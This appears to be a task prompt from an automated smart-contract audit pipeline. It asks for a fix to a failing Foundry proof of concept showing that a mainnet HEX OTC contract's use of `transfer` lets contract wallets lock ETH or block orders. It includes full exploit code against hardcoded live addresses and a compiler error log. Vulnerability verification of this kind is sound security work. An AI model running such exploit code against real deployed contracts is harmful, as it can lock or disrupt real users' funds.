You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.

Finding:
- title: Using Solidity `transfer` for ETH payouts lets contract wallets permanently lock or DOS ETH-backed trades
- claim: The contract uses Solidity's fixed-2300-gas `transfer` for every ETH payout. If the maker or taker is a smart contract whose fallback reverts or needs more than 2300 gas, `buyHEX()`, `buyETH()`, or `cancel()` reverts outright.
- impact: ETH-backed orders involving contract accounts can become permanently unfillable or unwithdrawable. A contract wallet maker can lock its escrowed ETH by creating an ETH offer that cannot be cancelled, and a HEX seller that is a contract wallet can make its order impossible for anyone to fill because the ETH payout to the seller always reverts. This creates realistic permanent lockup and order-level denial of service for smart-wallet users.
- exploit_paths: ["contract wallet creates ETH sell order via `offerETH()` -> later `cancel()` hits `offer.owner.transfer(offer.pay_amt)` -> revert -> escrowed ETH stays locked", "contract wallet creates HEX sell order via `offerHEX()` -> buyer calls `buyHEX()` -> `offer.owner.transfer(msg.value)` reverts -> order cannot be filled by anyone", "contract wallet tries to take an ETH order via `buyETH()` -> `msg.sender.transfer(offer.pay_amt)` reverts -> that taker cannot complete the trade"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IHEXOTC {
    function last_offer_id() external view returns (uint256);

    function offers(uint256 id)
        external
        view
        returns (
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            bytes32 offerId,
            uint256 escrowType
        );

    function offerETH(uint256 payAmt, uint256 buyAmt) external payable returns (uint256);
    function offerHEX(uint256 payAmt, uint256 buyAmt) external returns (uint256);
    function buyHEX(uint256 id) external payable returns (bool);
    function buyETH(uint256 id) external returns (bool);
    function cancel(uint256 id) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactETHForTokens(uint256 amountOutMin, address[] calldata path, address to, uint256 deadline)
        external
        payable
        returns (uint256[] memory amounts);
}

contract RevertingWallet {
    constructor() payable {}

    receive() external payable {
        revert("reject-eth");
    }

    function approveToken(address token, address spender, uint256 amount) external returns (bool) {
        return IERC20Like(token).approve(spender, amount);
    }

    function offerETH(address target, uint256 payAmt, uint256 buyAmt) external payable returns (bool) {
        try IHEXOTC(target).offerETH{value: msg.value}(payAmt, buyAmt) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function offerHEX(address target, uint256 payAmt, uint256 buyAmt) external returns (bool) {
        try IHEXOTC(target).offerHEX(payAmt, buyAmt) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function cancelOrder(address target, uint256 id) external returns (bool) {
        try IHEXOTC(target).cancel(id) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function buyETHOrder(address target, uint256 id) external returns (bool) {
        try IHEXOTC(target).buyETH(id) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function sweepToken(address token, address to) external returns (bool) {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        return IERC20Like(token).transfer(to, balance);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address internal constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 internal constant PATH_CANCEL_LOCKS_ETH = 1 << 0;
    uint256 internal constant PATH_BUY_HEX_DOS = 1 << 1;
    uint256 internal constant PATH_BUY_ETH_DOS = 1 << 2;

    uint256 internal constant ONE_HEART = 1;
    uint256 internal constant ONE_WEI = 1;
    uint256 internal constant RESERVED_NATIVE_FOR_PATHS = 3;
    uint256 internal constant SWAP_BUDGET = 0.001 ether;
    uint256 internal constant RECENT_OFFER_SCAN = 128;

    bool private _executed;
    bool private _validated;
    bool private _refuted;
    uint256 private _pathMask;
    address private _profitTokenAddress;
    uint256 private _profitAmountValue;

    constructor() {}

    receive() external payable {}

    function execute() external payable returns (uint256) {
        return _run();
    }

    function run() external payable returns (uint256) {
        return _run();
    }

    function exploit() external payable returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return _profitTokenAddress;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmountValue;
    }

    function hypothesisValidated() external view returns (bool) {
        return _validated;
    }

    function hypothesisRefuted() external view returns (bool) {
        return _refuted;
    }

    function exploitPathMask() external view returns (uint256) {
        return _pathMask;
    }

    function _run() internal returns (uint256) {
        if (_executed) {
            return _profitAmountValue;
        }

        _executed = true;
        _profitTokenAddress = address(0);
        _profitAmountValue = 0;

        if (block.chainid != 1 || TARGET.code.length == 0 || HEX.code.length == 0) {
            _refuted = true;
            return 0;
        }

        _prepareHexInventory();

        bool path1 = _validateOfferEthThenCancelLocksEscrow();
        bool path2 = _validateOfferHexThenBuyHexReverts();
        bool path3 = _validateBuyEthToContractWalletReverts();

        if (path1) _pathMask |= PATH_CANCEL_LOCKS_ETH;
        if (path2) _pathMask |= PATH_BUY_HEX_DOS;
        if (path3) _pathMask |= PATH_BUY_ETH_DOS;

        _validated = path1 && path2 && path3;
        _refuted = !_validated;
        return 0;
    }

    function _prepareHexInventory() internal {
        if (IERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
            return;
        }

        uint256 spendable = address(this).balance;
        if (spendable > RESERVED_NATIVE_FOR_PATHS) {
            uint256 budget = spendable - RESERVED_NATIVE_FOR_PATHS;
            if (budget > SWAP_BUDGET) {
                budget = SWAP_BUDGET;
            }

            address[] memory path = new address[](2);
            path[0] = WETH;
            path[1] = HEX;

            try IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: budget}(
                ONE_HEART, path, address(this), block.timestamp
            ) returns (uint256[] memory) {} catch {}
        }

        if (IERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
            return;
        }

        uint256 remainingSpend = address(this).balance;
        if (remainingSpend > RESERVED_NATIVE_FOR_PATHS) {
            _buyExistingHexOrder(remainingSpend - RESERVED_NATIVE_FOR_PATHS);
        }
    }

    function _buyExistingHexOrder(uint256 maxSpend) internal {
        (uint256 lastId, bool ok) = _safeLastOfferId();
        if (!ok || lastId == 0 || maxSpend == 0) {
            return;
        }

        uint256 scanned;
        for (uint256 id = lastId; id > 0 && scanned < RECENT_OFFER_SCAN; --id) {
            (bool offerOk, uint256 payAmt, uint256 buyAmt, , uint64 timestamp, uint256 escrowType) = _safeOffer(id);
            if (offerOk && timestamp != 0 && escrowType == 0 && payAmt > 0 && buyAmt > 0 && buyAmt <= maxSpend) {
                try IHEXOTC(TARGET).buyHEX{value: buyAmt}(id) returns (bool bought) {
                    if (bought && IERC20Like(HEX).balanceOf(address(this)) >= 2 * ONE_HEART) {
                        return;
                    }
                } catch {}
            }
            unchecked {
                ++scanned;
            }
        }
    }

    function _validateOfferEthThenCancelLocksEscrow() internal returns (bool) {
        if (address(this).balance < ONE_WEI) {
            // Concrete reason: this path permanently locks the maker's escrowed ETH,
            // so it cannot be executed using only temporary capital.
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        RevertingWallet maker = new RevertingWallet();
        bool offered = maker.offerETH{value: ONE_WEI}(TARGET, ONE_WEI, ONE_HEART);
        if (!offered) {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(maker), ONE_WEI, ONE_HEART, 1);
        if (!created) {
            return false;
        }

        bool cancelSucceeded = maker.cancelOrder(TARGET, id);
        if (cancelSucceeded) {
            return false;
        }

        return _isActiveOffer(id, address(maker), ONE_WEI, ONE_HEART, 1);
    }

    function _validateOfferHexThenBuyHexReverts() internal returns (bool) {
        if (address(this).balance < ONE_WEI || IERC20Like(HEX).balanceOf(address(this)) < ONE_HEART) {
            // Concrete reason: this path needs a real HEX balance to escrow.
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        RevertingWallet seller = new RevertingWallet();
        if (!IERC20Like(HEX).transfer(address(seller), ONE_HEART)) {
            return false;
        }
        if (!seller.approveToken(HEX, TARGET, ONE_HEART)) {
            return false;
        }
        if (!seller.offerHEX(TARGET, ONE_HEART, ONE_WEI)) {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(seller), ONE_HEART, ONE_WEI, 0);
        if (!created) {
            return false;
        }

        bool fillSucceeded;
        try IHEXOTC(TARGET).buyHEX{value: ONE_WEI}(id) returns (bool ok) {
            fillSucceeded = ok;
        } catch {
            fillSucceeded = false;
        }

        bool blocked = !fillSucceeded && _isActiveOffer(id, address(seller), ONE_HEART, ONE_WEI, 0);

        bool cancelRecovered = seller.cancelOrder(TARGET, id);
        seller.sweepToken(HEX, address(this));

        return blocked && cancelRecovered;
    }

    function _validateBuyEthToContractWalletReverts() internal returns (bool) {
        if (address(this).balance < ONE_WEI || IERC20Like(HEX).balanceOf(address(this)) < ONE_HEART) {
            // Concrete reason: this path needs both 1 wei of escrowed ETH and 1 heart of HEX.
            return false;
        }

        (uint256 beforeId, bool okBefore) = _safeLastOfferId();
        if (!okBefore) {
            return false;
        }

        try IHEXOTC(TARGET).offerETH{value: ONE_WEI}(ONE_WEI, ONE_HEART) returns (uint256) {} catch {
            return false;
        }

        (uint256 id, bool created) = _detectFreshOffer(beforeId, address(this), ONE_WEI, ONE_HEART, 1);
        if (!created) {
            return false;
        }

        RevertingWallet buyer = new RevertingWallet();
        if (!IERC20Like(HEX).transfer(address(buyer), ONE_HEART)) {
            return false;
        }
        if (!buyer.approveToken(HEX, TARGET, ONE_HEART)) {
            return false;
        }

        bool buySucceeded = buyer.buyETHOrder(TARGET, id);
        bool blocked = !buySucceeded && _isActiveOffer(id, address(this), ONE_WEI, ONE_HEART, 1);

        bool cancelRecovered;
        try IHEXOTC(TARGET).cancel(id) returns (bool ok) {
            cancelRecovered = ok;
        } catch {
            cancelRecovered = false;
        }
        buyer.sweepToken(HEX, address(this));

        return blocked && cancelRecovered;
    }

    function _detectFreshOffer(uint256 beforeId, address owner, uint256 payAmt, uint256 buyAmt, uint256 escrowType)
        internal
        view
        returns (uint256 id, bool created)
    {
        (uint256 afterId, bool okAfter) = _safeLastOfferId();
        if (!okAfter || afterId <= beforeId) {
            return (0, false);
        }

        id = afterId;
        created = _isActiveOffer(id, owner, payAmt, buyAmt, escrowType);
    }

    function _isActiveOffer(uint256 id, address owner, uint256 payAmt, uint256 buyAmt, uint256 escrowType)
        internal
        view
        returns (bool)
    {
        (bool ok, uint256 offerPayAmt, uint256 offerBuyAmt, address offerOwner, uint64 timestamp, uint256 offerEscrowType) =
            _safeOffer(id);
        return ok && timestamp != 0 && offerOwner == owner && offerPayAmt == payAmt && offerBuyAmt == buyAmt
            && offerEscrowType == escrowType;
    }

    function _safeLastOfferId() internal view returns (uint256 value, bool ok) {
        try IHEXOTC(TARGET).last_offer_id() returns (uint256 lastId) {
            return (lastId, true);
        } catch {
            return (0, false);
        }
    }

    function _safeOffer(uint256 id)
        internal
        view
        returns (
            bool ok,
            uint256 payAmt,
            uint256 buyAmt,
            address owner,
            uint64 timestamp,
            uint256 escrowType
        )
    {
        try IHEXOTC(TARGET).offers(id) returns (
            uint256 offerPayAmt,
            uint256 offerBuyAmt,
            address offerOwner,
            uint64 offerTimestamp,
            bytes32,
            uint256 offerEscrowType
        ) {
            return (true, offerPayAmt, offerBuyAmt, offerOwner, offerTimestamp, offerEscrowType);
        } catch {
            return (false, 0, 0, address(0), 0, 0);
        }
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (2333): Identifier already declared.
  --> test/ExploitPOC.t.sol:12:1:
   |
12 | interface IERC20Like {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The previous declaration is here:
 --> test/ExploitPOC.t.sol:4:1:
  |
4 | import "../src/FlawVerifier.sol";
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. include at least one callable no-arg external/public exploit entry function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. output ONLY Solidity code
